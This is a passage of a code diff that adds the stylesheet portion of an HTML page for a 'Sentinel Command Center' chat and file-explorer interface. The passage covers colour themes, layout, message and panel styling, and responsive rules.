@@ -1,0 +1,2704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Sentinel Command Center v9</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+:root {
+  /* ── Dimensions ── */
+  --sidebar-w: 280px;
+  --right-w: 320px;
+  --top-h: 48px;
+  --r: 10px;
+  --t: .2s ease;
+  --gap: 8px;
+
+  /* ── Cyberpunk HUD Palette ── */
+  --bg: #050608;
+  --bg2: #0a0e1a;
+  --bg3: #0d1428;
+  --surface: rgba(15,25,45,0.65);
+  --surface2: rgba(10,18,38,0.8);
+  --border: rgba(0,212,255,0.15);
+  --border-active: rgba(0,212,255,0.4);
+  --accent: #00d4ff;
+  --accent2: #00fff0;
+  --accent-soft: rgba(0,212,255,0.1);
+  --text: #e0e7ff;
+  --muted: #8b95b5;
+  --err: #ff4466;
+  --ok: #00ff88;
+  --warn: #ffcc44;
+  --grad: linear-gradient(135deg, #00d4ff, #0066ff);
+  --glass: blur(20px);
+}
+
+/* ── Theme: Matrix ── */
+[data-theme="matrix"] {
+  --accent: #00ff41;
+  --accent2: #39ff14;
+  --accent-soft: rgba(0,255,65,0.1);
+  --grad: linear-gradient(135deg, #00ff41, #008822);
+  --bg: #020a02;
+  --bg2: #051405;
+  --bg3: #072007;
+}
+
+/* ── Theme: Tron ── */
+[data-theme="tron"] {
+  --accent: #00ccff;
+  --accent2: #33ddff;
+  --accent-soft: rgba(0,204,255,0.1);
+  --grad: linear-gradient(135deg, #00ccff, #0055aa);
+  --bg: #020810;
+  --bg2: #041428;
+  --bg3: #062040;
+}
+
+/* ── Theme: Blood ── */
+[data-theme="blood"] {
+  --accent: #ff2244;
+  --accent2: #ff5577;
+  --accent-soft: rgba(255,34,68,0.1);
+  --grad: linear-gradient(135deg, #ff2244, #880022);
+  --bg: #0a0204;
+  --bg2: #140408;
+  --bg3: #200610;
+}
+
+/* ── Theme: Ember ── */
+[data-theme="ember"] {
+  --accent: #ff6600;
+  --accent2: #ff9933;
+  --accent-soft: rgba(255,102,0,0.1);
+  --grad: linear-gradient(135deg, #ff6600, #cc3300);
+  --bg: #0a0502;
+  --bg2: #140a04;
+  --bg3: #201008;
+}
+
+/* ── Theme: Frost ── */
+[data-theme="frost"] {
+  --accent: #88ccff;
+  --accent2: #aaddff;
+  --accent-soft: rgba(136,204,255,0.1);
+  --grad: linear-gradient(135deg, #88ccff, #4488cc);
+  --bg: #040810;
+  --bg2: #081428;
+  --bg3: #0c2040;
+}
+
+/* ── Theme: Phantom ── */
+[data-theme="phantom"] {
+  --accent: #aa66ff;
+  --accent2: #cc88ff;
+  --accent-soft: rgba(170,102,255,0.1);
+  --grad: linear-gradient(135deg, #aa66ff, #5533aa);
+  --bg: #060410;
+  --bg2: #0c0820;
+  --bg3: #120c30;
+}
+
+/* ── Theme: Neon ── */
+[data-theme="neon"] {
+  --accent: #ff00ff;
+  --accent2: #ff66ff;
+  --accent-soft: rgba(255,0,255,0.1);
+  --grad: linear-gradient(135deg, #ff00ff, #880088);
+  --bg: #0a020a;
+  --bg2: #140414;
+  --bg3: #200820;
+}
+
+/* ── Theme: Terminal ── */
+[data-theme="terminal"] {
+  --accent: #33ff33;
+  --accent2: #66ff66;
+  --accent-soft: rgba(51,255,51,0.1);
+  --grad: linear-gradient(135deg, #33ff33, #118811);
+  --bg: #000500;
+  --bg2: #001000;
+  --bg3: #002000;
+}
+
+/* ── Theme: Midnight ── */
+[data-theme="midnight"] {
+  --accent: #4A90D9;
+  --accent2: #5BA0E9;
+  --accent-soft: rgba(74,144,217,0.1);
+  --grad: linear-gradient(135deg, #4A90D9, #2a5a99);
+  --bg: #0a0a14;
+  --bg2: #14142e;
+  --bg3: #1e1e48;
+}
+
+/* ── Theme: Cyberpunk ── */
+[data-theme="cyberpunk"] {
+  --accent: #ff0080;
+  --accent2: #ff66cc;
+  --accent-soft: rgba(255,0,128,0.1);
+  --grad: linear-gradient(135deg, #ff0080, #8800ff);
+  --bg: #08020a;
+  --bg2: #100418;
+  --bg3: #180828;
+}
+
+/* ── Theme: Solar ── */
+[data-theme="solar"] {
+  --accent: #ffaa00;
+  --accent2: #ffcc44;
+  --accent-soft: rgba(255,170,0,0.1);
+  --grad: linear-gradient(135deg, #ffaa00, #ff5500);
+  --bg: #0a0802;
+  --bg2: #141004;
+  --bg3: #201808;
+}
+
+/* ── Theme: Arctic ── */
+[data-theme="arctic"] {
+  --accent: #66ffff;
+  --accent2: #99ffff;
+  --accent-soft: rgba(102,255,255,0.1);
+  --grad: linear-gradient(135deg, #66ffff, #3388aa);
+  --bg: #020810;
+  --bg2: #041428;
+  --bg3: #082040;
+}
+
+/* ── Base ── */
+html, body {
+  height: 100%;
+  overflow: hidden;
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+  font-size: 14px;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+}
+
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  z-index: 0;
+  pointer-events: none;
+  background:
+    radial-gradient(ellipse 60% 50% at 15% 20%, rgba(0,100,255,.08) 0%, transparent 60%),
+    radial-gradient(ellipse 50% 60% at 85% 80%, var(--accent-soft) 0%, transparent 60%);
+  animation: bgShift 14s ease-in-out infinite alternate;
+}
+
+@keyframes bgShift {
+  0% { opacity: .7; transform: scale(1); }
+  100% { opacity: 1; transform: scale(1.06); }
+}
+
+/* ── App Grid ── */
+#app {
+  position: relative;
+  display: grid;
+  height: 100vh;
+  height: 100dvh;
+  z-index: 1;
+  grid-template-columns: var(--sidebar-w) 1fr var(--right-w);
+  grid-template-rows: 1fr;
+  transition: grid-template-columns var(--t);
+}
+
+/* Panel collapse states */
+#app.sidebar-collapsed {
+  grid-template-columns: 0 1fr var(--right-w);
+}
+#app.right-collapsed {
+  grid-template-columns: var(--sidebar-w) 1fr 0;
+}
+#app.both-collapsed {
+  grid-template-columns: 0 1fr 0;
+}
+
+/* ── Sidebar ── */
+#sidebar {
+  display: flex;
+  flex-direction: column;
+  background: var(--surface);
+  backdrop-filter: var(--glass);
+  -webkit-backdrop-filter: var(--glass);
+  border-right: 1px solid var(--border);
+  overflow: hidden;
+  transition: transform var(--t), opacity var(--t);
+  min-width: 0;
+}
+
+#app.sidebar-collapsed #sidebar {
+  transform: translateX(-100%);
+  opacity: 0;
+}
+
+#sb-logo {
+  padding: 14px 16px 10px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+.logo-name {
+  font-size: 1rem;
+  font-weight: 700;
+  background: var(--grad);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  letter-spacing: .5px;
+}
+
+.logo-sub {
+  font-size: .62rem;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  margin-top: 1px;
+}
+
+#sb-nav {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+  padding: 6px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+.nb {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  width: 100%;
+  padding: 8px 10px;
+  background: transparent;
+  border: none;
+  border-radius: 7px;
+  color: var(--muted);
+  font-size: .85rem;
+  cursor: pointer;
+  transition: all var(--t);
+  text-align: left;
+}
+
+.nb:hover, .nb.on {
+  background: var(--accent-soft);
+  color: var(--accent);
+}
+
+.nb .ic {
+  font-size: .95rem;
+  width: 18px;
+  text-align: center;
+  flex-shrink: 0;
+}
+
+#sb-search {
+  padding: 8px 10px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+#sb-search input {
+  width: 100%;
+  padding: 6px 10px;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: .8rem;
+  outline: none;
+  transition: border-color var(--t);
+}
+
+#sb-search input:focus {
+  border-color: var(--accent);
+}
+
+#sb-convs {
+  flex: 1;
+  overflow-y: auto;
+  padding: 6px;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+
+.conv-group {
+  margin-bottom: 4px;
+}
+
+.conv-group-hdr {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 6px 8px;
+  cursor: pointer;
+  border-radius: 6px;
+  transition: background var(--t);
+  user-select: none;
+}
+
+.conv-group-hdr:hover {
+  background: var(--accent-soft);
+}
+
+.conv-group-label {
+  font-size: .72rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: .8px;
+  color: var(--muted);
+}
+
+.conv-group-count {
+  font-size: .65rem;
+  color: var(--muted);
+  background: var(--surface2);
+  padding: 1px 6px;
+  border-radius: 8px;
+}
+
+.conv-group-chevron {
+  font-size: .7rem;
+  color: var(--muted);
+  transition: transform var(--t);
+}
+
+.conv-group.collapsed .conv-group-chevron {
+  transform: rotate(-90deg);
+}
+
+.conv-group-body {
+  overflow: hidden;
+  transition: max-height var(--t);
+}
+
+.conv-group.collapsed .conv-group-body {
+  max-height: 0 !important;
+}
+
+.conv-item {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 7px 10px;
+  border-radius: 6px;
+  cursor: pointer;
+  transition: all var(--t);
+  margin: 1px 0;
+  position: relative;
+}
+
+.conv-item:hover {
+  background: var(--accent-soft);
+}
+
+.conv-item.on {
+  background: var(--accent-soft);
+  border: 1px solid var(--border-active);
+}
+
+.conv-item-body {
+  flex: 1;
+  min-width: 0;
+}
+
+.conv-item-title {
+  font-size: .82rem;
+  color: var(--text);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.conv-item-meta {
+  font-size: .68rem;
+  color: var(--muted);
+  margin-top: 1px;
+}
+
+.conv-item-del {
+  opacity: 0;
+  background: none;
+  border: none;
+  color: var(--err);
+  cursor: pointer;
+  font-size: .8rem;
+  padding: 2px 4px;
+  border-radius: 4px;
+  transition: opacity var(--t);
+  flex-shrink: 0;
+}
+
+.conv-item:hover .conv-item-del {
+  opacity: .6;
+}
+
+.conv-item-del:hover {
+  opacity: 1 !important;
+}
+
+#sb-footer {
+  padding: 8px 10px;
+  border-top: 1px solid var(--border);
+  flex-shrink: 0;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+#sb-footer select {
+  width: 100%;
+  padding: 5px 8px;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: .78rem;
+  cursor: pointer;
+  outline: none;
+  -webkit-appearance: none;
+  appearance: none;
+}
+
+.tog-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: .76rem;
+  color: var(--muted);
+}
+
+.nc-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 28px;
+  height: 28px;
+  background: var(--accent-soft);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--accent);
+  font-size: .9rem;
+  cursor: pointer;
+  transition: all var(--t);
+}
+
+.nc-btn:hover {
+  background: var(--accent-soft);
+  border-color: var(--accent);
+}
+
+/* ── Main Area ── */
+#main {
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  min-width: 0;
+}
+
+/* ── Top Bar ── */
+#top {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  height: var(--top-h);
+  padding: 0 12px;
+  background: var(--surface);
+  backdrop-filter: var(--glass);
+  -webkit-backdrop-filter: var(--glass);
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+  z-index: 50;
+  container-type: inline-size;
+  container-name: topbar;
+}
+
+/* Container queries: progressive hiding into overflow */
+@container topbar (max-width: 500px) {
+  #top-actions .top-btn:not(#run-btn):not(#stop-btn) {
+    display: none;
+  }
+  #top-overflow {
+    display: block;
+  }
+  .top-btn .btn-label {
+    display: none;
+  }
+}
+
+@container topbar (max-width: 350px) {
+  #top-ctx {
+    display: none;
+  }
+}
+
+#top-left {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-shrink: 0;
+}
+
+#hbg {
+  display: none;
+  background: none;
+  border: none;
+  color: var(--text);
+  font-size: 1.1rem;
+  cursor: pointer;
+  padding: 4px;
+  border-radius: 6px;
+  transition: background var(--t);
+}
+
+#hbg:hover {
+  background: var(--accent-soft);
+}
+
+#sdot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--ok);
+  box-shadow: 0 0 8px var(--ok);
+  flex-shrink: 0;
+  transition: all var(--t);
+}
+
+#sdot.err { background: var(--err); box-shadow: 0 0 8px var(--err); }
+/* "degraded" = we reached the service and it reported itself unhealthy (503),
+   which is a different situation from not reaching it at all. */
+#sdot.warn { background: var(--warn); box-shadow: 0 0 8px var(--warn); }
+#sdot.act {
+  background: var(--accent);
+  box-shadow: 0 0 8px var(--accent);
+  animation: dotpulse 1.4s ease-in-out infinite;
+}
+
+@keyframes dotpulse {
+  0%, 100% { opacity: 1; box-shadow: 0 0 6px var(--accent); }
+  50% { opacity: .6; box-shadow: 0 0 14px var(--accent); }
+}
+
+#top-ctx {
+  font-size: .82rem;
+  color: var(--muted);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  flex: 1;
+  min-width: 0;
+}
+
+#top-actions {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+  flex-shrink: 0;
+}
+
+.top-btn {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  padding: 5px 10px;
+  background: var(--accent-soft);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--muted);
+  font-size: .78rem;
+  cursor: pointer;
+  transition: all var(--t);
+  white-space: nowrap;
+}
+
+.top-btn:hover {
+  background: var(--accent-soft);
+  color: var(--accent);
+  border-color: var(--border-active);
+}
+
+.top-btn.primary {
+  background: var(--grad);
+  color: #fff;
+  border: none;
+}
+
+.top-btn.danger {
+  background: rgba(255,68,102,0.14);
+  border-color: rgba(255,68,102,0.35);
+  color: var(--err);
+}
+
+#top-overflow {
+  display: none;
+  position: relative;
+}
+
+#top-overflow-menu {
+  position: absolute;
+  top: 100%;
+  right: 0;
+  margin-top: 4px;
+  background: var(--surface2);
+  backdrop-filter: var(--glass);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 4px;
+  min-width: 180px;
+  z-index: 100;
+  display: none;
+  box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+}
+
+#top-overflow-menu.open {
+  display: block;
+}
+
+.overflow-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 7px 10px;
+  border-radius: 6px;
+  color: var(--text);
+  font-size: .82rem;
+  cursor: pointer;
+  transition: background var(--t);
+}
+
+.overflow-item:hover {
+  background: var(--accent-soft);
+}
+
+/* ── Content Area ── */
+#content {
+  flex: 1;
+  overflow: hidden;
+  position: relative;
+}
+
+.pg {
+  position: absolute;
+  inset: 0;
+  display: none;
+  flex-direction: column;
+}
+
+.pg.on {
+  display: flex;
+}
+
+/* ── Chat Page ── */
+#pg-chat {
+  flex-direction: row;
+}
+
+#chat-area {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  min-width: 0;
+  overflow: hidden;
+}
+
+#msgs {
+  flex: 1;
+  overflow-y: auto;
+  padding: 16px;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.msg {
+  display: flex;
+  gap: 8px;
+  max-width: 85%;
+  animation: msgin .2s ease;
+}
+
+@keyframes msgin {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.msg.u { align-self: flex-end; flex-direction: row-reverse; }
+.msg.a { align-self: flex-start; }
+.msg.s { align-self: center; max-width: 70%; }
+.msg.e { align-self: flex-start; }
+
+.mav {
+  width: 28px;
+  height: 28px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: .8rem;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+
+.msg.u .mav { background: var(--grad); }
+.msg.a .mav { background: var(--accent-soft); border: 1px solid var(--border); }
+.msg.e .mav { background: rgba(255,68,102,.12); border: 1px solid rgba(255,68,102,.45); }
+
+.mb {
+  padding: 8px 12px;
+  border-radius: 12px;
+  font-size: .88rem;
+  line-height: 1.6;
+  word-break: break-word;
+}
+
+.msg.u .mb {
+  background: var(--grad);
+  color: #fff;
+  border-bottom-right-radius: 4px;
+}
+
+.msg.a .mb {
+  background: var(--surface);
+  backdrop-filter: blur(10px);
+  border: 1px solid var(--border);
+  border-bottom-left-radius: 4px;
+}
+
+.msg.s .mb {
+  background: rgba(255,200,0,.07);
+  border: 1px solid rgba(255,200,0,.18);
+  color: rgba(255,220,100,.9);
+  font-size: .78rem;
+  text-align: center;
+  border-radius: 8px;
+}
+
+/* Errors used to fall through to assistant styling, so a failed request looked
+   exactly like a normal model reply. Give them their own unmistakable look. */
+.msg.e .mb {
+  background: rgba(255,68,102,.09);
+  border: 1px solid rgba(255,68,102,.45);
+  border-left: 3px solid var(--err);
+  color: #ffb3c1;
+  border-bottom-left-radius: 4px;
+}
+
+/* ── Brain Lab key/value rows ── */
+.bl-k {
+  font-size: .62rem;
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.bl-v {
+  font-size: .82rem;
+  color: var(--text);
+  margin-top: 2px;
+  word-break: break-word;
+}
+
+#brain-badge.ok { color: var(--ok); border-color: rgba(0,255,136,.45); }
+#brain-badge.warn { color: var(--warn); border-color: rgba(255,204,68,.45); }
+#brain-badge.err { color: var(--err); border-color: rgba(255,68,102,.45); }
+
+/* ── Input Area ── */
+#inp-area {
+  padding: 10px 12px;
+  background: var(--surface);
+  backdrop-filter: var(--glass);
+  -webkit-backdrop-filter: var(--glass);
+  border-top: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+.inp-row {
+  display: flex;
+  align-items: flex-end;
+  gap: 6px;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 6px 8px;
+  transition: border-color var(--t);
+}
+
+.inp-row:focus-within {
+  border-color: var(--border-active);
+  box-shadow: 0 0 0 3px var(--accent-soft);
+}
+
+#msginp {
+  flex: 1;
+  background: none;
+  border: none;
+  outline: none;
+  color: var(--text);
+  font-size: .88rem;
+  resize: none;
+  max-height: 120px;
+  min-height: 20px;
+  line-height: 1.5;
+  font-family: inherit;
+}
+
+#msginp::placeholder { color: var(--muted); }
+
+.ia {
+  display: flex;
+  align-items: center;
+  gap: 2px;
+  flex-shrink: 0;
+}
+
+.ab, .sb {
+  width: 30px;
+  height: 30px;
+  border-radius: 6px;
+  border: none;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: .9rem;
+  transition: all var(--t);
+}
+
+.ab {
+  background: var(--accent-soft);
+  color: var(--muted);
+}
+
+.ab:hover {
+  background: var(--accent-soft);
+  color: var(--accent);
+}
+
+.sb {
+  background: var(--grad);
+  color: #fff;
+}
+
+.sb:hover { opacity: .85; transform: scale(1.04); }
+.sb:disabled { opacity: .35; transform: none; cursor: not-allowed; }
+
+/* ── File Explorer Panel ── */
+#file-explorer {
+  display: flex;
+  flex-direction: column;
+  background: var(--surface);
+  backdrop-filter: var(--glass);
+  -webkit-backdrop-filter: var(--glass);
+  border-left: 1px solid var(--border);
+  overflow: hidden;
+  transition: transform var(--t), opacity var(--t);
+  min-width: 0;
+}
+
+#app.right-collapsed #file-explorer {
+  transform: translateX(100%);
+  opacity: 0;
+}
+
+#fe-header {
+  padding: 10px 12px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+#fe-title {
+  font-size: .85rem;
+  font-weight: 600;
+  color: var(--accent);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-bottom: 6px;
+}
+
+#fe-breadcrumb {
+  display: flex;
+  align-items: center;
+  gap: 2px;
+  font-size: .72rem;
+  color: var(--muted);
+  flex-wrap: wrap;
+}
+
+#fe-breadcrumb .bc-sep {
+  margin: 0 2px;
+  opacity: .5;
+}
+
+#fe-breadcrumb .bc-item {
+  cursor: pointer;
+  padding: 1px 4px;
+  border-radius: 4px;
+  transition: all var(--t);
+}
+
+#fe-breadcrumb .bc-item:hover {
+  background: var(--accent-soft);
+  color: var(--accent);
+}
+
+#fe-tree {
+  flex: 1;
+  overflow-y: auto;
+  padding: 6px;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+
+.fe-entry {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 5px 8px;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: all var(--t);
+  font-size: .82rem;
+  user-select: none;
+}
+
+.fe-entry:hover {
+  background: var(--accent-soft);
+}
+
+.fe-entry-icon {
+  width: 16px;
+  text-align: center;
+  flex-shrink: 0;
+  font-size: .85rem;
+}
+
+.fe-entry-name {
+  flex: 1;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.fe-entry-size {
+  font-size: .68rem;
+  color: var(--muted);
+  flex-shrink: 0;
+}
+
+.fe-entry-actions {
+  display: none;
+  gap: 2px;
+}
+
+.fe-entry:hover .fe-entry-actions {
+  display: flex;
+}
+
+.fe-action-btn {
+  background: none;
+  border: none;
+  color: var(--muted);
+  cursor: pointer;
+  font-size: .75rem;
+  padding: 2px 4px;
+  border-radius: 4px;
+  transition: all var(--t);
+}
+
+.fe-action-btn:hover {
+  color: var(--accent);
+  background: var(--accent-soft);
+}
+
+.fe-dir-children {
+  margin-left: 14px;
+  border-left: 1px solid var(--border);
+  padding-left: 4px;
+}
+
+.fe-dir.collapsed > .fe-dir-children {
+  display: none;
+}
+
+.fe-dir-toggle {
+  width: 14px;
+  text-align: center;
+  font-size: .65rem;
+  color: var(--muted);
+  cursor: pointer;
+  transition: transform var(--t);
+  flex-shrink: 0;
+}
+
+.fe-dir.collapsed > .fe-entry .fe-dir-toggle {
+  transform: rotate(-90deg);
+}
+
+/* ── File Viewer Modal ── */
+#file-viewer {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.7);
+  z-index: 300;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  backdrop-filter: blur(4px);
+}
+
+#file-viewer.open {
+  display: flex;
+}
+
+#fv-content {
+  width: 80vw;
+  max-width: 900px;
+  max-height: 80vh;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+}
+
+#fv-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+#fv-title {
+  font-size: .9rem;
+  font-weight: 600;
+  color: var(--text);
+}
+
+#fv-close {
+  background: none;
+  border: none;
+  color: var(--muted);
+  font-size: 1.1rem;
+  cursor: pointer;
+  padding: 4px 8px;
+  border-radius: 6px;
+  transition: all var(--t);
+}
+
+#fv-close:hover {
+  color: var(--text);
+  background: var(--accent-soft);
+}
+
+#fv-body {
+  flex: 1;
+  overflow: auto;
+  padding: 16px;
+  font-family: 'SF Mono', 'Fira Code', monospace;
+  font-size: .82rem;
+  line-height: 1.6;
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+
+#fv-body img {
+  max-width: 100%;
+  border-radius: 8px;
+}
+
+/* ── Command Palette ── */
+#cmd-palette {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.6);
+  z-index: 400;
+  display: none;
+  align-items: flex-start;
+  justify-content: center;
+  padding-top: 15vh;
+  backdrop-filter: blur(4px);
+}
+
+#cmd-palette.open {
+  display: flex;
+}
+
+#cmd-box {
+  width: 90%;
+  max-width: 520px;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 16px 64px rgba(0,0,0,0.6);
+}
+
+#cmd-input {
+  width: 100%;
+  padding: 14px 16px;
+  background: var(--surface2);
+  border: none;
+  border-bottom: 1px solid var(--border);
+  color: var(--text);
+  font-size: .95rem;
+  outline: none;
+}
+
+#cmd-results {
+  max-height: 300px;
+  overflow-y: auto;
+}
+
+.cmd-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 16px;
+  cursor: pointer;
+  transition: background var(--t);
+}
+
+.cmd-item:hover, .cmd-item.on {
+  background: var(--accent-soft);
+}
+
+.cmd-item-key {
+  font-size: .7rem;
+  color: var(--muted);
+  background: var(--surface2);
+  padding: 2px 6px;
+  border-radius: 4px;
+  flex-shrink: 0;
+}
+
+/* ── Toast Notifications ── */
+#toast-container {
+  position: fixed;
+  bottom: 16px;
+  right: 16px;
+  z-index: 500;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.toast {
+  padding: 10px 14px;
+  background: var(--surface2);
+  backdrop-filter: var(--glass);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  font-size: .82rem;
+  color: var(--text);
+  animation: toastIn .25s ease;
+  max-width: 320px;
+}
+
+.toast.err { border-color: rgba(255,68,102,0.3); }
+.toast.ok { border-color: rgba(0,255,136,0.3); }
+
+@keyframes toastIn {
+  from { opacity: 0; transform: translateY(8px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+/* ── Skeleton Loading ── */
+.skeleton {
+  background: linear-gradient(90deg, var(--surface) 25%, var(--accent-soft) 50%, var(--surface) 75%);
+  background-size: 200% 100%;
+  animation: skelShimmer 1.4s infinite;
+  border-radius: 6px;
+  height: 14px;
+  margin: 4px 0;
+}
+
+@keyframes skelShimmer {
+  0% { background-position: 200% 0; }
+  100% { background-position: -200% 0; }
+}
+
+.skeleton-card { padding: 8px 10px; margin: 2px 0; }
+.skeleton-title { width: 70%; margin-bottom: 4px; }
+.skeleton-meta { width: 40%; height: 10px; }
+
+/* ── Scrollbar ── */
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+/* ── Responsive: Tablet ── */
+@media (max-width: 1199px) {
+  :root {
+    --sidebar-w: 50px;
+    --right-w: 280px;
+  }
+
+  #sb-logo .logo-name, #sb-logo .logo-sub,
+  .nb span:not(.ic),
+  #sb-search,
+  #sb-convs .conv-group-hdr .conv-group-label,
+  #sb-convs .conv-group-count,
+  #sb-convs .conv-item-meta,
+  #sb-convs .conv-item-title,
+  #sb-footer {
+    display: none;
+  }
+
+  #sb-logo { padding: 8px; border-bottom: none; }
+  #sb-nav { padding: 4px; border-bottom: none; align-items: center; }
+  .nb { width: 34px; height: 34px; padding: 0; justify-content: center; }
+  #sb-convs { padding: 4px; align-items: center; }
+
+  .conv-item {
+    width: 34px;
+    height: 34px;
+    padding: 0;
+    justify-content: center;
+    margin: 2px 0;
+  }
+
+  .conv-item::before {
+    content: '💬';
+    font-size: .75rem;
+  }
+
+  .conv-item-del { display: none; }
+
+  #hbg { display: block; }
+
+  .top-btn .btn-label { display: none; }
+  .top-btn { padding: 5px 8px; }
+}
+
+/* ── Responsive: Mobile ── */
+@media (max-width: 767px) {
+  :root {
+    --sidebar-w: 0px;
+    --right-w: 0px;
+  }
+
+  #app {
+    grid-template-columns: 1fr;
+  }
+
+  #sidebar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    bottom: 0;
+    width: min(280px, 85vw);
+    z-index: 200;
+    transform: translateX(-101%);
+    transition: transform var(--t);
+  }
+
+  #sidebar.mob-open {
+    transform: translateX(0);
+  }
+
+  #file-explorer {
+    position: fixed;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    width: min(320px, 90vw);
+    z-index: 200;
+    transform: translateX(101%);
+    transition: transform var(--t);
+  }
+
+  #file-explorer.mob-open {
+    transform: translateX(0);
+  }
+
+  #top-overflow { display: block; }
+
+  #top-actions .top-btn:not(.primary):not(.danger) {
+    display: none;
+  }
+
+  #btabs {
+    display: block;
+  }
+}
+
+/* ── Ultrawide ── */
+@media (min-width: 1920px) {
+  #app {
+    max-width: 1700px;
+    margin: 0 auto;
+    box-shadow: 0 0 80px rgba(0,0,0,0.7);
+  }
+
+  :root {
+    --sidebar-w: 320px;
+    --right-w: 380px;
+  }
+}
+
+/* ── Mobile Bottom Tabs ── */
+#btabs {
+  display: none;
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: var(--surface);
+  backdrop-filter: var(--glass);
+  -webkit-backdrop-filter: var(--glass);
+  border-top: 1px solid var(--border);
+  padding-bottom: env(safe-area-inset-bottom);
+  z-index: 100;
+}
+
+.tbr {
+  display: flex;
+  justify-content: space-around;
+}
+
+.tbb {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 6px 4px;
+  min-height: 46px;
+  background: none;
+  border: none;
+  color: var(--muted);
+  font-size: .6rem;
+  cursor: pointer;
+  transition: color var(--t);
+  gap: 2px;
+}
+
+.tbb .ti { font-size: 1.1rem; }
+.tbb.on { color: var(--accent); }
+
+/* ── Overlay for mobile drawers ── */
+#mob-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.5);
+  z-index: 150;
+  display: none;
+  backdrop-filter: blur(2px);
+}
+
+#mob-overlay.open {
+  display: block;
+}
+
+/* ── Reduced Motion ── */
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: 0.01ms !important;
+    transition-duration: 0.01ms !important;
+  }
+}
+
+/* ── Focus Indicators ── */
+:focus-visible {
+  outline: 2px solid var(--accent);
+  outline-offset: 2px;
+}
+
